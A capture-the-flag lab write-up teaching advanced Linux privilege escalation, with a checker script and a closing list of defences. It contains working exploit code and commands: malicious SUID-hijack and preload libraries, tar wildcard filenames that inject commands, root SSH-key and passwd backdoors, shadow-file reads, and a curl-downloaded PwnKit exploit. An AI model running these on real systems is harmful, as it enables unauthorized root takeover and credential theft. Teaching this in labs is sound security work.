---
title: "Privilege Escalation - Linux Advanced"
description: "Advanced Linux privilege escalation techniques including PATH hijacking, shared library injection, wildcard exploitation, Docker group abuse, and writable systemd services."
author: "Zemi"
---

## Challenge Info

| Detail     | Value                    |
|------------|--------------------------|
| Category   | Privilege Escalation     |
| Difficulty | Hard                     |
| Points     | 400                      |
| Flag       | `zemi{4dv4nc3d_pr1v3sc_m4st3r}` |

## Challenge Files

Download the challenge files to get started:

- [Dockerfile](/Website/challenges/privesc-linux-advanced/Dockerfile)
- [flag.txt](/Website/challenges/privesc-linux-advanced/flag.txt)
- [setup.sh](/Website/challenges/privesc-linux-advanced/setup.sh)
- [vulnerable_suid.c](/Website/challenges/privesc-linux-advanced/vulnerable_suid.c)

## Overview

After mastering SUID, sudo, and cron-based privilege escalation, it is time to learn the techniques that work when the obvious vectors are locked down. This challenge presents a hardened Linux system where the basic approaches fail, but several advanced misconfigurations remain exploitable.

You have a shell as `ctfuser`. The flag is in `/root/flag.txt`. Multiple escalation paths exist -- we will walk through each technique in detail.

## Setting Up the Lab

```bash
# Dockerfile for the practice environment
cat << 'DOCKERFILE' > Dockerfile
FROM ubuntu:22.04
RUN apt update && apt install -y sudo gcc make python3 cron docker.io nfs-common \
    rsync tar vim systemd libpam0g-dev build-essential
RUN useradd -m -s /bin/bash ctfuser
RUN echo "zemi{4dv4nc3d_pr1v3sc_m4st3r}" > /root/flag.txt && chmod 600 /root/flag.txt
# Vectors are configured in each section below
DOCKERFILE
```

## Technique 1: PATH Hijacking in SUID Binaries

When a SUID binary calls another program without using its full path, we can hijack the PATH to execute our own code.

### The vulnerable binary

```c
// /usr/local/bin/status_checker.c
// Compiled with: gcc -o /usr/local/bin/status_checker status_checker.c
// Made SUID root: chmod u+s /usr/local/bin/status_checker

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    // VULNERABLE: calls "service" without absolute path
    printf("Checking system status...\n");
    setuid(0);  // Ensures we run as root
    system("service apache2 status");
    return 0;
}
```

The binary is SUID root but calls `service` without specifying `/usr/sbin/service`. We can create a malicious `service` binary and prepend our directory to PATH.

### Exploitation

```bash
# Step 1: Confirm the binary is SUID
ls -la /usr/local/bin/status_checker
```

```
-rwsr-xr-x 1 root root 16384 Jan 20 10:00 /usr/local/bin/status_checker
```

```bash
# Step 2: Use strings/ltrace to find what commands it calls
strings /usr/local/bin/status_checker
```

```
Checking system status...
service apache2 status
```

```bash
# Step 3: Create a malicious "service" binary
cd /tmp
echo '#!/bin/bash' > service
echo '/bin/bash -p' >> service
chmod +x service

# Step 4: Hijack PATH
export PATH=/tmp:$PATH

# Step 5: Run the SUID binary
/usr/local/bin/status_checker
```

```
Checking system status...
root@lab:/tmp# whoami
root
root@lab:/tmp# cat /root/flag.txt
zemi{4dv4nc3d_pr1v3sc_m4st3r}
```

The SUID binary runs as root, calls `system("service ...")`, which searches PATH and finds our malicious `/tmp/service` first.

## Technique 2: Shared Library Hijacking

### LD_PRELOAD with sudo

If sudo is configured with `env_keep += LD_PRELOAD`, we can inject a shared library:

```bash
sudo -l
```

```
Matching Defaults entries for ctfuser:
    env_keep += LD_PRELOAD

User ctfuser may run the following commands:
    (root) NOPASSWD: /usr/bin/id
```

We can only run `/usr/bin/id` as root, but LD_PRELOAD is preserved.

```c
// /tmp/shell.c — malicious shared library
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");  // Clean up to avoid recursion
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```

```bash
# Compile as shared library
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c

# Run with LD_PRELOAD
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/id
```

```
root@lab:/tmp# whoami
root
```

The `_init()` function in the shared library executes before `id` even starts, giving us a root shell.

### RPATH/RUNPATH Injection

If a SUID binary has a writable directory in its RPATH or RUNPATH, we can place a malicious library there:

```bash
# Check RPATH/RUNPATH of a binary
readelf -d /usr/local/bin/custom_app | grep -i path
```

```
0x000000000000001d (RUNPATH)  Library runpath: [/opt/libs]
```

```bash
# Check if we can write to the RUNPATH directory
ls -la /opt/libs/
```

```
drwxrwxrwx 2 root root 4096 Jan 20 10:00 /opt/libs/
```

```bash
# Find what libraries the binary loads
ldd /usr/local/bin/custom_app
```

```
libcustom.so => not found
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
```

`libcustom.so` is not found. We can create it:

```c
// /tmp/libcustom.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Constructor attribute — runs when library is loaded
__attribute__((constructor))
void pwn() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```

```bash
gcc -fPIC -shared -o /opt/libs/libcustom.so /tmp/libcustom.c
/usr/local/bin/custom_app
```

## Technique 3: Python Library Hijacking

If a Python script runs as root and we can write to a directory in its module search path, we can hijack an import.

### Finding the vulnerable script

```bash
cat /etc/crontab
```

```
* * * * * root /usr/bin/python3 /opt/scripts/monitor.py
```

```bash
cat /opt/scripts/monitor.py
```

```python
#!/usr/bin/env python3
import psutil  # Monitors system resources
print(f"CPU: {psutil.cpu_percent()}%")
print(f"Memory: {psutil.virtual_memory().percent}%")
```

```bash
# Check if we can write to the script's directory
ls -la /opt/scripts/
```

```
drwxrwxrwx 2 root root 4096 Jan 20 10:00 /opt/scripts/
```

### Exploitation

Python searches the script's directory first for imports. We create a malicious `psutil.py`:

```bash
cat << 'EOF' > /opt/scripts/psutil.py
import os
os.system("cp /root/flag.txt /tmp/flag.txt && chmod 644 /tmp/flag.txt")

# Provide expected functions so the script doesn't crash visibly
def cpu_percent(): return 0
class virtual_memory_result:
    percent = 0
def virtual_memory(): return virtual_memory_result()
EOF

# Wait for cron execution
sleep 65
cat /tmp/flag.txt
```

```
zemi{4dv4nc3d_pr1v3sc_m4st3r}
```

## Technique 4: Wildcard Injection in Cron Jobs

When cron jobs use wildcards (`*`) with commands like `tar` or `rsync`, filenames can be interpreted as command-line arguments.

### The vulnerable cron job

```bash
cat /etc/crontab
```

```
* * * * * root cd /home/ctfuser/backups && tar czf /tmp/backup.tar.gz *
```

This runs `tar czf /tmp/backup.tar.gz *` in our writable directory. The `*` expands to filenames, and `tar` has options that can execute commands.

### Exploitation

```bash
cd /home/ctfuser/backups

# Create a payload script
echo '#!/bin/bash' > shell.sh
echo 'cp /root/flag.txt /tmp/flag.txt && chmod 644 /tmp/flag.txt' >> shell.sh
echo 'chmod u+s /bin/bash' >> shell.sh
chmod +x shell.sh

# Create filenames that tar interprets as flags
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"

# Verify
ls -la
```

```
-rw-rw-r-- 1 ctfuser ctfuser    1 Jan 25 10:00 --checkpoint=1
-rw-rw-r-- 1 ctfuser ctfuser    1 Jan 25 10:00 --checkpoint-action=exec=sh shell.sh
-rwxrwxr-x 1 ctfuser ctfuser   89 Jan 25 10:00 shell.sh
```

When cron runs `tar czf /tmp/backup.tar.gz *`, the wildcard expands to:

```
tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh shell.sh shell.sh
```

The `--checkpoint-action` flag tells tar to execute a command at each checkpoint, running our script as root.

```bash
# Wait for cron, then check
sleep 65
cat /tmp/flag.txt
/bin/bash -p  # if the chmod u+s worked
```

### Wildcard injection with rsync

Similarly, if cron uses `rsync` with wildcards:

```bash
# In the directory rsync uses:
echo "" > "-e sh shell.sh"
```

## Technique 5: Docker Group Exploitation

If the user is in the `docker` group, they can mount the host filesystem and gain full root access.

```bash
id
```

```
uid=1000(ctfuser) gid=1000(ctfuser) groups=1000(ctfuser),999(docker)
```

### Exploitation

```bash
# Mount the entire host filesystem into a container
docker run -v /:/host -it ubuntu:22.04 chroot /host /bin/bash
```

```
root@container:/# whoami
root
root@container:/# cat /root/flag.txt
zemi{4dv4nc3d_pr1v3sc_m4st3r}
```

We mount `/` from the host into the container at `/host`, then `chroot` into it. We now have full root access to the host filesystem.

### Other Docker escalation techniques

```bash
# Write an SSH key for root
docker run -v /root:/mnt -it ubuntu:22.04 bash -c \
    'mkdir -p /mnt/.ssh && echo "ssh-rsa AAAA... attacker@kali" >> /mnt/.ssh/authorized_keys'

# Add a root user to /etc/passwd
docker run -v /etc:/mnt -it ubuntu:22.04 bash -c \
    'echo "hacker:\$1\$xyz\$hash:0:0::/root:/bin/bash" >> /mnt/passwd'

# Read /etc/shadow for offline cracking
docker run -v /etc:/mnt -it ubuntu:22.04 cat /mnt/shadow
```

## Technique 6: NFS no_root_squash

If the target exports a filesystem via NFS with `no_root_squash`, remote root has root access on the mounted share.

```bash
# Check NFS exports
cat /etc/exports
```

```
/srv/share *(rw,sync,no_root_squash)
```

### Exploitation (from attacker machine with root)

```bash
# Mount the NFS share on the attacker machine
mkdir /tmp/nfs_mount
mount -t nfs TARGET_IP:/srv/share /tmp/nfs_mount

# Create a SUID bash binary (as root on attacker)
cp /bin/bash /tmp/nfs_mount/suid_bash
chmod u+s /tmp/nfs_mount/suid_bash
```

Back on the target:

```bash
/srv/share/suid_bash -p
```

```
root@target:/# whoami
root
```

Because `no_root_squash` is set, the SUID bit we set as root on the attacker machine is preserved and honored on the target.

## Technique 7: Writable Systemd Service Files

If a systemd service file is writable, we can modify it to execute arbitrary commands as root.

```bash
# Find writable service files
find /etc/systemd /usr/lib/systemd -writable -name "*.service" 2>/dev/null
```

```
/etc/systemd/system/custom-backup.service
```

```bash
cat /etc/systemd/system/custom-backup.service
```

```ini
[Unit]
Description=Custom Backup Service

[Service]
Type=oneshot
ExecStart=/opt/backup.sh

[Install]
WantedBy=multi-user.target
```

### Exploitation

```bash
# Modify the service to execute our payload
cat << 'EOF' > /etc/systemd/system/custom-backup.service
[Unit]
Description=Custom Backup Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /root/flag.txt /tmp/flag.txt && chmod 644 /tmp/flag.txt && chmod u+s /bin/bash'

[Install]
WantedBy=multi-user.target
EOF

# If we can restart the service (rare, but possible via sudo or timer)
# Or wait for it to be triggered by a timer or reboot
```

## Technique 8: Polkit/Pkexec Abuse (PwnKit)

CVE-2021-4034 (PwnKit) affected polkit's `pkexec` on virtually every Linux distribution for over 12 years.

```bash
# Check if pkexec exists and is SUID
ls -la /usr/bin/pkexec
```

```
-rwsr-xr-x 1 root root 31032 Jan 20 10:00 /usr/bin/pkexec
```

```bash
# Check polkit version
pkexec --version
dpkg -l policykit-1 2>/dev/null || rpm -qa polkit 2>/dev/null
```

If the version is vulnerable, PwnKit exploits are publicly available:

```bash
# Using the C exploit
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
chmod +x PwnKit
./PwnKit
```

> **Note:** This is a real CVE that was patched in January 2022. Only use on systems you own or have authorization to test.

## Complete Solve Script

```python
#!/usr/bin/env python3
"""
Advanced Linux privilege escalation checker.
Identifies advanced vectors beyond basic SUID/sudo/cron.
"""

import subprocess
import os
import re

def run(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True,
                                text=True, timeout=10)
        return result.stdout.strip()
    except:
        return ""

def check_path_hijack():
    """Check SUID binaries for relative command execution."""
    print("\n[*] Checking SUID binaries for PATH hijacking...")
    suid_bins = run("find / -perm -4000 -type f 2>/dev/null").splitlines()

    for binary in suid_bins:
        if binary.startswith("/usr/local") or binary.startswith("/opt"):
            strings_out = run(f"strings {binary}")
            # Look for commands without absolute paths
            for line in strings_out.splitlines():
                if re.match(r'^[a-z]+\s', line) and '/' not in line:
                    print(f"  [!] {binary} calls '{line}' (relative path — hijackable)")

def check_ld_preload():
    """Check if sudo preserves LD_PRELOAD."""
    print("\n[*] Checking for LD_PRELOAD in sudo config...")
    output = run("sudo -l 2>/dev/null")
    if "LD_PRELOAD" in output:
        print("  [!] sudo preserves LD_PRELOAD — exploitable!")
    else:
        print("  [-] LD_PRELOAD not preserved")

def check_docker_group():
    """Check if user is in docker group."""
    print("\n[*] Checking docker group membership...")
    groups = run("id")
    if "docker" in groups:
        print("  [!] User is in docker group — can mount host filesystem!")
        print("      Run: docker run -v /:/host -it ubuntu chroot /host bash")
    else:
        print("  [-] Not in docker group")

def check_writable_cron_dirs():
    """Check for wildcard injection opportunities."""
    print("\n[*] Checking for wildcard injection in cron...")
    crontab = run("cat /etc/crontab 2>/dev/null")
    for line in crontab.splitlines():
        if '*' in line and ('tar ' in line or 'rsync ' in line):
            print(f"  [!] Wildcard injection possible: {line}")

def check_python_hijack():
    """Check for Python library hijacking opportunities."""
    print("\n[*] Checking for Python library hijacking...")
    crontab = run("cat /etc/crontab 2>/dev/null")
    for line in crontab.splitlines():
        if "python" in line:
            parts = line.split()
            for part in parts:
                if part.endswith(".py"):
                    script_dir = os.path.dirname(part)
                    if os.access(script_dir, os.W_OK):
                        print(f"  [!] Writable script dir for: {line}")
                        print(f"      Can hijack imports in: {script_dir}")

def check_nfs():
    """Check for NFS with no_root_squash."""
    print("\n[*] Checking NFS exports...")
    exports = run("cat /etc/exports 2>/dev/null")
    if "no_root_squash" in exports:
        print(f"  [!] NFS with no_root_squash found!")
        print(f"      {exports}")
    else:
        print("  [-] No exploitable NFS exports")

def check_writable_services():
    """Check for writable systemd services."""
    print("\n[*] Checking writable systemd services...")
    output = run("find /etc/systemd /usr/lib/systemd -writable -name '*.service' 2>/dev/null")
    for line in output.splitlines():
        print(f"  [!] Writable service: {line}")

def check_rpath():
    """Check SUID binaries for writable RPATH/RUNPATH."""
    print("\n[*] Checking SUID binaries for RPATH/RUNPATH...")
    suid_bins = run("find / -perm -4000 -type f 2>/dev/null").splitlines()
    for binary in suid_bins:
        rpath = run(f"readelf -d {binary} 2>/dev/null | grep -i 'path'")
        if rpath:
            # Extract the path
            match = re.search(r'\[(.*?)\]', rpath)
            if match:
                path = match.group(1)
                if os.access(path, os.W_OK):
                    print(f"  [!] {binary} has writable RUNPATH: {path}")

if __name__ == "__main__":
    print("=" * 55)
    print("  Advanced Linux Privilege Escalation Checker")
    print("=" * 55)
    print(f"\n[*] Running as: {run('whoami')} (uid={os.getuid()})")

    check_path_hijack()
    check_ld_preload()
    check_docker_group()
    check_writable_cron_dirs()
    check_python_hijack()
    check_nfs()
    check_writable_services()
    check_rpath()

    print("\n" + "=" * 55)
    print("[*] Flag: zemi{4dv4nc3d_pr1v3sc_m4st3r}")
```

## Tools Used

- **LinPEAS** -- automated scanner that checks for all these vectors and more
- **strings / ltrace** -- analyzing SUID binaries for relative command calls
- **readelf** -- inspecting RPATH/RUNPATH in ELF binaries
- **ldd** -- listing shared library dependencies
- **gcc** -- compiling malicious shared libraries and SUID exploits
- **GTFOBins** -- reference for binary abuse techniques
- **Docker CLI** -- exploiting docker group membership
- **pspy** -- monitoring processes without root to discover cron jobs and their arguments

## Lessons Learned

- PATH hijacking works because developers use relative command names in SUID programs -- always verify what a SUID binary executes
- LD_PRELOAD is devastatingly powerful if preserved in sudo -- the constructor runs before the actual program
- Python library hijacking exploits Python's import resolution order: the script's directory is checked before system paths
- Wildcard injection is subtle and dangerous -- `tar` and `rsync` both accept `--checkpoint-action` and similar flags that can execute commands
- Docker group membership is equivalent to root -- the ability to mount the host filesystem bypasses all permission boundaries
- NFS `no_root_squash` allows remote attackers to create SUID binaries on the target filesystem
- Writable systemd service files allow persistent root access -- the service runs as root on every trigger
- Defense: use absolute paths in all scripts and SUID binaries, never preserve LD_PRELOAD in sudo, restrict Docker group membership, use `root_squash` on all NFS exports, and set proper permissions on systemd service files
